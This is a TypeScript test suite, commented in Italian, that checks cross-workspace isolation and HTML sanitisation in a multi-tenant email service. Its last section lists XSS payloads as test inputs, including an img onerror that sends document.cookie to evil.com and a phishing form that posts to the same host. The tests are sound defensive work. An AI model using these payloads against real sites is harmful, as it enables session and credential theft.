/**
 * Test Security: Email Workspace Isolation
 *
 * Verifica che:
 * - Un workspace NON può inviare email da un indirizzo di un altro workspace
 * - Un workspace NON può leggere/modificare email di un altro workspace
 * - La funzione RPC send_workspace_email valida ownership mittente
 * - La funzione RPC send_workspace_email valida ownership reply_to
 * - Il lookup workspace restituisce NULL per indirizzi non mappati
 * - L'inbound webhook assegna correttamente il workspace
 * - La sanitizzazione HTML blocca tutti i vettori XSS noti
 *
 * NOTA: Questi sono test di logica applicativa, non test RLS PostgreSQL.
 * I test RLS richiedono un DB reale e sono in tests/integration/.
 */

import { describe, expect, it, vi, beforeEach } from 'vitest';

// ─── MOCK SETUP ───

const mockResendSend = vi.fn().mockResolvedValue({ data: { id: 'resend-ok' }, error: null });

vi.mock('resend', () => ({
  Resend: vi.fn(() => ({
    emails: { send: mockResendSend },
  })),
}));

vi.stubEnv('RESEND_API_KEY', 'test-key');

// Mock rate limit per permettere sempre l'invio nei test
vi.mock('@/lib/security/rate-limit', () => ({
  rateLimit: vi.fn().mockResolvedValue({ allowed: true, remaining: 99, source: 'mock' }),
}));

const mockFrom = vi.fn();
const mockRpc = vi.fn();

vi.mock('@/lib/db/client', () => ({
  supabaseAdmin: {
    from: (...args: unknown[]) => mockFrom(...args),
    rpc: (...args: unknown[]) => mockRpc(...args),
  },
}));

// Mock workspaceQuery — restituisce lo stesso mock di supabaseAdmin
vi.mock('@/lib/db/workspace-query', () => ({
  workspaceQuery: () => ({
    from: (...args: unknown[]) => mockFrom(...args),
  }),
}));

import {
  sendWorkspaceEmail,
  validateSenderAddress,
  lookupWorkspaceByEmail,
} from '@/lib/email/workspace-email-service';

// ─── FIXTURES ───

const WORKSPACE_A = 'ws-alpha-111';
const WORKSPACE_B = 'ws-beta-222';
const ADDRESS_A = 'addr-alpha-001';
const ADDRESS_B = 'addr-beta-001';

const addressWorkspaceA = {
  id: ADDRESS_A,
  workspace_id: WORKSPACE_A,
  email_address: 'info@alpha-shipping.it',
  display_name: 'Alpha Shipping',
  is_primary: true,
  is_verified: true,
  resend_domain_id: null,
  domain_verified_at: null,
  created_at: '2026-01-01T00:00:00Z',
  updated_at: '2026-01-01T00:00:00Z',
};

const addressWorkspaceB = {
  id: ADDRESS_B,
  workspace_id: WORKSPACE_B,
  email_address: 'info@beta-logistics.it',
  display_name: 'Beta Logistics',
  is_primary: true,
  is_verified: true,
  resend_domain_id: null,
  domain_verified_at: null,
  created_at: '2026-01-01T00:00:00Z',
  updated_at: '2026-01-01T00:00:00Z',
};

beforeEach(() => {
  vi.clearAllMocks();
  mockResendSend.mockResolvedValue({ data: { id: 'resend-ok' }, error: null });
});

// ─── TESTS ───

describe('Cross-Workspace Isolation: Indirizzo Mittente', () => {
  it('workspace A NON può usare indirizzo di workspace B', async () => {
    // Setup: query per ADDRESS_B nel WORKSPACE_A → non trovato (eq workspace_id filtra)
    mockFrom.mockReturnValue({
      select: () => ({
        eq: () => ({
          eq: () => ({
            single: () => Promise.resolve({ data: null, error: { message: 'Not found' } }),
          }),
        }),
      }),
    });

    const result = await validateSenderAddress(WORKSPACE_A, ADDRESS_B);

    expect(result.valid).toBe(false);
    expect(result.error).toContain('non trovato');
  });

  it('workspace B NON può usare indirizzo di workspace A', async () => {
    mockFrom.mockReturnValue({
      select: () => ({
        eq: () => ({
          eq: () => ({
            single: () => Promise.resolve({ data: null, error: { message: 'Not found' } }),
          }),
        }),
      }),
    });

    const result = await validateSenderAddress(WORKSPACE_B, ADDRESS_A);

    expect(result.valid).toBe(false);
  });

  it('workspace A può usare il PROPRIO indirizzo', async () => {
    mockFrom.mockReturnValue({
      select: () => ({
        eq: () => ({
          eq: () => ({
            single: () => Promise.resolve({ data: addressWorkspaceA, error: null }),
          }),
        }),
      }),
    });

    const result = await validateSenderAddress(WORKSPACE_A, ADDRESS_A);

    expect(result.valid).toBe(true);
    expect(result.address!.email_address).toBe('info@alpha-shipping.it');
  });
});

describe('Cross-Workspace Isolation: Invio Email', () => {
  it('invio da workspace A con indirizzo B → BLOCCATO prima di RPC', async () => {
    // Validazione fallisce → mai arriva a RPC
    mockFrom.mockReturnValue({
      select: () => ({
        eq: () => ({
          eq: () => ({
            single: () => Promise.resolve({ data: null, error: { message: 'Not found' } }),
          }),
        }),
      }),
    });

    const result = await sendWorkspaceEmail({
      workspaceId: WORKSPACE_A,
      fromAddressId: ADDRESS_B, // Indirizzo di workspace B!
      to: ['victim@example.it'],
      subject: 'Spoofing attempt',
      bodyHtml: '<p>Trying to send from wrong workspace</p>',
    });

    expect(result.success).toBe(false);
    // CRITICO: né RPC né Resend devono essere chiamati
    expect(mockRpc).not.toHaveBeenCalled();
    expect(mockResendSend).not.toHaveBeenCalled();
  });

  it('RPC SENDER_NOT_OWNED → errore chiaro', async () => {
    // Setup: validazione passa (mock non ideale) ma RPC cattura
    mockFrom.mockImplementation((table: string) => {
      if (table === 'workspace_email_addresses') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                single: () => Promise.resolve({ data: addressWorkspaceA, error: null }),
              }),
            }),
          }),
        };
      }
      if (table === 'outreach_channel_config') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                single: () => Promise.resolve({ data: { daily_limit: 100 }, error: null }),
              }),
            }),
          }),
        };
      }
      if (table === 'emails') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                neq: () => ({
                  gte: () => Promise.resolve({ count: 0, error: null }),
                }),
              }),
            }),
          }),
        };
      }
      return {};
    });

    mockRpc.mockResolvedValue({
      data: null,
      error: { message: 'SENDER_NOT_OWNED: indirizzo non appartiene' },
    });

    const result = await sendWorkspaceEmail({
      workspaceId: WORKSPACE_A,
      fromAddressId: ADDRESS_A,
      to: ['target@example.it'],
      subject: 'Test',
      bodyHtml: '<p>Test</p>',
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('non appartiene');
    // CRITICO: Resend NON deve essere chiamato
    expect(mockResendSend).not.toHaveBeenCalled();
  });

  it('RPC REPLY_NOT_OWNED → errore se reply a email di altro workspace', async () => {
    mockFrom.mockImplementation((table: string) => {
      if (table === 'workspace_email_addresses') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                single: () => Promise.resolve({ data: addressWorkspaceA, error: null }),
              }),
            }),
          }),
        };
      }
      if (table === 'outreach_channel_config') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                single: () => Promise.resolve({ data: { daily_limit: 100 }, error: null }),
              }),
            }),
          }),
        };
      }
      if (table === 'emails') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                neq: () => ({
                  gte: () => Promise.resolve({ count: 0, error: null }),
                }),
              }),
            }),
          }),
        };
      }
      return {};
    });

    mockRpc.mockResolvedValue({
      data: null,
      error: { message: "REPLY_NOT_OWNED: L'email di risposta non appartiene" },
    });

    const result = await sendWorkspaceEmail({
      workspaceId: WORKSPACE_A,
      fromAddressId: ADDRESS_A,
      to: ['target@example.it'],
      subject: 'Re: test',
      bodyHtml: '<p>Reply</p>',
      replyToEmailId: 'email-from-workspace-b',
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('non appartiene');
    expect(mockResendSend).not.toHaveBeenCalled();
  });
});

describe('Cross-Workspace Isolation: Lookup Email Routing', () => {
  it('indirizzo di workspace A → restituisce workspace A', async () => {
    mockRpc.mockResolvedValue({ data: WORKSPACE_A, error: null });

    const wsId = await lookupWorkspaceByEmail('info@alpha-shipping.it');

    expect(wsId).toBe(WORKSPACE_A);
  });

  it('indirizzo non mappato → restituisce null (legacy/superadmin)', async () => {
    mockRpc.mockResolvedValue({ data: null, error: null });

    const wsId = await lookupWorkspaceByEmail('unknown@random.com');

    expect(wsId).toBeNull();
  });

  it('ogni indirizzo mappa a UN SOLO workspace (unicità DB)', async () => {
    // Questo è garantito dal UNIQUE constraint, ma verifichiamo il comportamento
    mockRpc.mockResolvedValue({ data: WORKSPACE_B, error: null });

    const wsId = await lookupWorkspaceByEmail('info@beta-logistics.it');

    expect(wsId).toBe(WORKSPACE_B);
    expect(wsId).not.toBe(WORKSPACE_A);
  });
});

describe('Errore Generico: Non esporre dettagli DB (FIX #10)', () => {
  it('errore RPC sconosciuto → messaggio generico', async () => {
    mockFrom.mockImplementation((table: string) => {
      if (table === 'workspace_email_addresses') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                single: () => Promise.resolve({ data: addressWorkspaceA, error: null }),
              }),
            }),
          }),
        };
      }
      if (table === 'outreach_channel_config') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                single: () => Promise.resolve({ data: { daily_limit: 100 }, error: null }),
              }),
            }),
          }),
        };
      }
      if (table === 'emails') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                neq: () => ({
                  gte: () => Promise.resolve({ count: 0, error: null }),
                }),
              }),
            }),
          }),
        };
      }
      return {};
    });

    mockRpc.mockResolvedValue({
      data: null,
      error: { message: 'relation "workspace_email_addresses" does not exist' },
    });

    const result = await sendWorkspaceEmail({
      workspaceId: WORKSPACE_A,
      fromAddressId: ADDRESS_A,
      to: ['target@example.it'],
      subject: 'Test',
      bodyHtml: '<p>Test</p>',
    });

    expect(result.success).toBe(false);
    // NON deve esporre nomi tabelle DB
    expect(result.error).not.toContain('workspace_email_addresses');
    expect(result.error).not.toContain('relation');
    expect(result.error).toContain('Errore interno');
  });
});

describe('Sanitizzazione HTML: Vettori XSS', () => {
  // Testiamo che il servizio rimuove tutti i vettori pericolosi PRIMA di passare alla RPC

  function setupMocksForSanitizationTest() {
    mockFrom.mockImplementation((table: string) => {
      if (table === 'workspace_email_addresses') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                single: () => Promise.resolve({ data: addressWorkspaceA, error: null }),
              }),
            }),
          }),
        };
      }
      if (table === 'outreach_channel_config') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                single: () => Promise.resolve({ data: { daily_limit: 100 }, error: null }),
              }),
            }),
          }),
        };
      }
      if (table === 'emails') {
        return {
          select: () => ({
            eq: () => ({
              eq: () => ({
                neq: () => ({
                  gte: () => Promise.resolve({ count: 0, error: null }),
                }),
              }),
            }),
          }),
          update: () => ({
            eq: () => Promise.resolve({ error: null }),
          }),
        };
      }
      return {};
    });
    mockRpc.mockResolvedValue({ data: 'email-uuid', error: null });
  }

  const xssVectors = [
    {
      name: 'script tag',
      input: '<p>Ok</p><script>document.cookie</script>',
      forbidden: '<script>',
    },
    {
      name: 'iframe embed',
      input: '<iframe src="https://evil.com/phish"></iframe>',
      forbidden: '<iframe',
    },
    {
      name: 'img onerror',
      input: '<img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">',
      forbidden: 'onerror',
    },
    {
      name: 'svg onload',
      input: '<svg onload="alert(1)"><circle r="10"/></svg>',
      forbidden: 'onload',
    },
    {
      name: 'a href javascript:',
      input: '<a href="javascript:alert(document.domain)">Click</a>',
      forbidden: 'javascript:',
    },
    {
      name: 'object tag',
      input: '<object data="evil.swf"></object>',
      forbidden: '<object',
    },
    {
      name: 'embed tag',
      input: '<embed src="evil.swf">',
      forbidden: '<embed',
    },
    {
      name: 'form phishing',
      input:
        '<form action="https://evil.com/steal"><input name="password"><button>Login</button></form>',
      forbidden: '<form',
    },
    {
      name: 'style injection',
      input: '<style>body{background:url("https://evil.com/track")}</style>',
      forbidden: '<style>',
    },
    {
      name: 'data: href',
      input: '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
      forbidden: 'data:',
    },
    {
      name: 'meta refresh',
      input: '<meta http-equiv="refresh" content="0;url=https://evil.com">',
      forbidden: '<meta',
    },
    {
      name: 'base tag hijack',
      input: '<base href="https://evil.com/">',
      forbidden: '<base',
    },
    {
      name: 'link stylesheet',
      input: '<link rel="stylesheet" href="https://evil.com/steal.css">',
      forbidden: '<link',
    },
    // ─── BYPASS AVANZATI (FIX #7) ───
    {
      name: 'HTML entity encoded javascript:',
      input: '<a href="&#106;avascript:alert(1)">Click</a>',
      forbidden: 'javascript:',
    },
    {
      name: 'vbscript: protocol',
      input: '<a href="vbscript:MsgBox(1)">Click</a>',
      forbidden: 'vbscript:',
    },
    {
      name: 'svg tag (full)',
      input: '<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>',
      forbidden: '<svg',
    },
    {
      name: 'math tag',
      input: '<math><maction actiontype="statusline">XSS</maction></math>',
      forbidden: '<math',
    },
    {
      name: 'applet tag',
      input: '<applet code="evil.class" codebase="https://evil.com"></applet>',
      forbidden: '<applet',
    },
    {
      name: 'script recomposition',
      input: '<scr<script>ipt>alert(1)</scr</script>ipt>',
      forbidden: '<script',
    },
    {
      name: 'data: with HTML entities',
      input: '<a href="&#100;ata:text/html,<script>alert(1)</script>">Click</a>',
      forbidden: 'data:',
    },
  ];

  for (const vector of xssVectors) {
    it(`dovrebbe bloccare: ${vector.name}`, async () => {
      setupMocksForSanitizationTest();

      await sendWorkspaceEmail({
        workspaceId: WORKSPACE_A,
        fromAddressId: ADDRESS_A,
        to: ['target@example.it'],
        subject: 'Test XSS',
        bodyHtml: vector.input,
      });

      const rpcCall = mockRpc.mock.calls[0][1];
      expect(rpcCall.p_body_html).not.toContain(vector.forbidden);
    });
  }
});
